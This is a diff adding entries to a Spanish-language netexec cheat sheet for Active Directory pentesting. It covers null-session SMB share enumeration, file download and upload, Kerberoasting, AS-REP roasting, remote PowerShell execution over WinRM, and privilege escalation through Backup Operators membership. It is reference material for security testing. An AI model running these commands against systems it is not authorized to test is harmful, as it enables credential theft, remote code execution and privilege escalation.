@@ -51,9 +51,14 @@ netexec smb <IP-ADDRESS> -u 'a' -p ''
 netexec smb <IP-ADDRESS> -u 'null' -p '' --shares
 ```
 
+#### Enumeración de directorios compartidos SMB y mostrar datos y archivos en un archivo JSON que guarda sobre los archivos compartidos con acceso de lectura
+```
+netexec smb <IP-ADDRESS> -u 'null' -p '' -M spider_plus
+```
+
 #### Descargar un archivo de un directorio compartido
 ```
-netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --share <DIRECTORY-NAME> --get-file <FIEL-NAME> <OUTPUT-NAME>
+netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --share <DIRECTORY-NAME> --get-file <FILE-NAME> <OUTPUT-NAME>
 ```
 
 #### Descargar todos los archivos que contenga el servidor
@@ -63,7 +68,7 @@ netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M spider_plus -o DOWNL
 
 #### Enviar un archivo de un directorio compartido
 ```
-netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FIEL-NAME> \\Windows\\Temp\\<OUTPUT-NAME>
+netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --put-file <FILE-NAME> \\Windows\\Temp\\<OUTPUT-NAME>
 ```
 
 #### Enumeración de los usuarios del Directorio Activo
@@ -74,6 +79,11 @@ netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --users
 #### Enumeración de los grupos del Directorio Activo
 ```
 netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --groups
+```
+
+#### Comprobar a que grupo pertenece nuestro usuario
+```
+netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M groupmembership -o USER="<USERNAME>"
 ```
 
 #### Enumeración de los usarios logueados actualmente
@@ -135,6 +145,16 @@ netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting <OUTPU
 #### Ataque de Asreproast
 ```
 netexec ldap <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' --asreproast <OUTPUT-FILE>
+```
+
+#### Ejecutar comando Powershell
+```
+netexec winrm <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -C '<COMMAND>'
+```
+
+#### Elevar Privilegios cuando el usuario pertenece al grupo "Backup Operators"
+```
+netexec smb <IP-ADDRESS> -u '<USERNAME>' -p '<PASSWORD>' -M backup_operator
 ```
 
 ---
